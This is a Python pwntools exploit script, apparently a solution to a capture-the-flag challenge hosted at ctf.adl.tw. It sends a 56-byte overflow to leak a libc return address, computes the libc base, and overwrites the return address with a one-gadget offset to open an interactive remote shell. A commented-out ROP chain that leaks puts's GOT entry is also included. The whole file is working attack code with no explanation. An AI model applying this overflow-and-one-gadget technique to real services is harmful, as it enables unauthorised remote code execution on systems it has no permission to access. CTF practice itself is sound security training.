from pwn import *

r = remote('ctf.adl.tw', 11006) 
context.arch = "amd64"
printf_plt = 0x400550
printf_got = 0x601028
puts_plt = 0x400530
puts_got = 0x601018
read_plt = 0x400560
pop_rdi_ret = 0x400773
leave_ret = 0x40070a
ret = 0x40051e
puts_off = 0x6f690
main_off = "0x20740"
shell = "0xf1147"
#0x38 to main's ret
'''
payload = p64(shell)
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(ret)
payload += p64(shell)
payload += p64(0x601080)
payload += p64(leave_ret)
           
r.send(payload)
'''
r.recvuntil('Give me some message:\n')
r.sendline('a' * 56)
r.recvuntil('echo:\n'+'a'*56)
main_202_add = r.recv()
main_202_add = main_202_add[:-1]
main_202_add = main_202_add + (8-len(main_202_add))*'\0'
main_202_add = u64(main_202_add)
print "main_202_add = ", main_202_add

base = main_202_add - 202 - int(main_off, 0)
print ('base: ', base)

sh = base + int(shell, 0)
payload = 'a' * 56 + p64(sh)
r.send(payload)

r.interactive()
